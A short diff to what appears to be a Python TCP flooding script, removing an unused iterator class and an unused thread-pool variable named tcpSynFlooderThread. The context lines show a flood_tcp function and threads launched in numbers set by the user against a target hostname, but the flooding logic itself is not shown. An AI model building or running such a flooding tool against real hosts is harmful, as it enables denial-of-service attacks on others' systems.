@@ -18,14 +18,6 @@ def flood_tcp(host: str):
     except (socket.error, socket.timeout):
         pass
 
-class InfiniteIterator:
-    def __init__(self, hostname: str):
-        self.hostname = hostname
-
-    def __iter__(self):
-        while True:
-            yield self.hostname,
-
 
 class DoYourThing(threading.Thread):
     def __init__(self, hostname: str):
@@ -44,7 +36,6 @@ def run():
     amount, hostname = sys.argv[1:]
     print('Pinging %s on %s threads', hostname, amount)
     amount = int(amount)
-    tcpSynFlooderThread = ThreadPoolExecutor(max_workers=amount)
     now = (time.time())
     for _ in range(amount):
         DoYourThing(hostname).start()
